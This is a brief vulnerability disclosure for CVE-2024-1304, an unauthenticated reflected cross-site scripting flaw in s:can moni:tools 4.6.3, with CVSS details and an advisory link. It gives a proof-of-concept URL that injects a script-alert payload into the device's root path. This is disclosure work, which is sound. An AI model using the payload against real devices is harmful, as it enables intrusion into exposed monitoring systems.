# CVE-2024-1304 --- Badgermeter moni tool - Reflected Cross Site Scripting XSS
https://www.incibe.es/en/incibe-cert/notices/aviso-sci/multiple-vulnerabilities-badger-meters-monitool

CVE-2024-1304: 6.3 | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L | CWE-79.

**Software link**: https://www.s-can.at/en/product/monitool/

**Version**: 4.6.3

**@author**: Guillermo García Molina

**Description**: The software s:can moni:tools up to and including version 4.6.3 is affected by an unauthenticated reflected cross-site scripting (XSS) vulnerability that allows remote attackers to inject arbitrary web script or HTML via the url.

## POC

The root url of the device, in this case http://192.168.0.1/, is affected by an unauthenticated injection of arbitrary code:

[http://192.168.0.1//sunku<script>alert(1)</script>l36qj ]
 
![XSS1](https://github.com/guillermogm4/CVE-2024-1304---Badgermeter-moni-tool-Reflected-Cross-Site-Scripting-XSS/assets/26895345/e725e472-2dce-430b-ae05-57ec6ac50dbc)

 
![image](https://github.com/guillermogm4/CVE-2024-1304---Badgermeter-moni-tool-Reflected-Cross-Site-Scripting-XSS/assets/26895345/774b91b5-38b4-4efa-b3cd-20436d2bb780)
